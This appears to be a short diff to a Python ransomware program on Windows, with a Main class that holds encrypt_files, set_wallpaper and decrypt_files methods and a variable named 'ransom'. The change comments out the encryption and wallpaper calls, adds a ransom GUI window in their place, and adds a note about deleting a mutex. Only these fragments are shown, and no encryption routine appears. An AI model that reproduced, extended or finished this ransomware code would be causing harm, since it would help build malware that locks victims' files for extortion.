@@ -13,6 +13,7 @@ import win32event
 # Import classes
 import Crypt
 import Base
+import Gui
 
 
 ################
@@ -38,12 +39,14 @@ class Main(Base.Base):
     # handle action
     if action == "encrypt" and not os.path.isfile(self.encrypted_file_list):
       # Start encryption
-      self.encrypt_files(file_list)
-      self.set_wallpaper()
+      #self.encrypt_files(file_list)
+      #self.set_wallpaper()
+      # Present GUI
+      window = Gui.Gui()
     elif action == "decrypt":
       # Start decryption
       self.decrypt_files()
-
+      
 
   def decrypt_files(self):
     # Function to decrypt the provided files
@@ -197,4 +200,5 @@ if __name__ == "__main__":
     # Otherwise run
     else:
       ransom = Main(action, key)
+      # Delete the mutex
 
